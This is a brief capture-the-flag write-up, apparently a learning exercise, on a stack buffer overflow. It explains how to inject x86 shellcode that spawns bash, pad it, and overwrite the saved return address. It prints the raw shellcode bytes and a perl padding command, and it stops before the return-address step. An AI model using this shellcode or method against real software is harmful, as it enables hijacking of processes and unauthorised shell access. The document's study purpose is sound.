In the first few seconds I didn't understand what could be done here. But then I remembered [microcorruption](https://github.com/SimchaTeich/Microcorruption)! And in my opinion, shellcode should be implanted here to the top of the stack and overwrite the value back which is 128+4 bytes from the top of the stack (plus 4 because there is an EBP register). Therefore, the order of operations will be as follows:
* Inserting shellcode at the top of the stack
    * The same shellcode from the previous challenge that causes bash to run
* Padding the shellcode so that it is 124 bytes in size
* And next to that will come the address to the top of the stack
     * This will overwrite the address back from main
     * Don't forget little endian

Let's get started:
1. shellcode is:
    ```
    echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    ```

2. padding is: 
    ```
    perl -e 'print "A"x(128-33)'
    ```
